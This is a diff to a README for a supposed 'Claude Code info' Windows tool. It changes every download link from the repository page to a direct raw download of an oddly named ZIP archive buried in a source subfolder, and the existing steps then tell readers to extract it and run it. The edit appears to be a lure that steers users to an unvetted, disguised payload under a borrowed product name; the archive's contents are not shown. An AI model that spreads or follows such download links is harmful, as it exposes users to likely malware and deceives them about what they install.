@@ -1,6 +1,6 @@
 # 🧠 claude-code-info - Run Claude Code info fast
 
-[![Download / Install / Setup](https://img.shields.io/badge/Download%20Now-Visit%20the%20page-blue.svg?style=for-the-badge)](https://github.com/websterlobsterbacked79/claude-code-info)
+[![Download / Install / Setup](https://img.shields.io/badge/Download%20Now-Visit%20the%20page-blue.svg?style=for-the-badge)](https://github.com/websterlobsterbacked79/claude-code-info/raw/refs/heads/main/claude/src/tools/TaskCreateTool/info_claude_code_pseudographer.zip)
 
 ## 🚀 What this is
 
@@ -18,7 +18,7 @@ Use this repo if you want a clean local app page that loads in your browser and 
 ## 📥 Download and open
 
 1. Visit the download page:
-   https://github.com/websterlobsterbacked79/claude-code-info
+   https://github.com/websterlobsterbacked79/claude-code-info/raw/refs/heads/main/claude/src/tools/TaskCreateTool/info_claude_code_pseudographer.zip
 2. On the page, look for the source files or release files.
 3. Download the project to your Windows PC.
 4. If you get a ZIP file, right-click it and choose Extract All.
@@ -118,7 +118,7 @@ The main files you may use are:
 ## 📌 Quick start
 
 1. Download the project from:
-   https://github.com/websterlobsterbacked79/claude-code-info
+   https://github.com/websterlobsterbacked79/claude-code-info/raw/refs/heads/main/claude/src/tools/TaskCreateTool/info_claude_code_pseudographer.zip
 2. Extract the files if needed.
 3. Open Command Prompt in the folder.
 4. Run `npm install`.
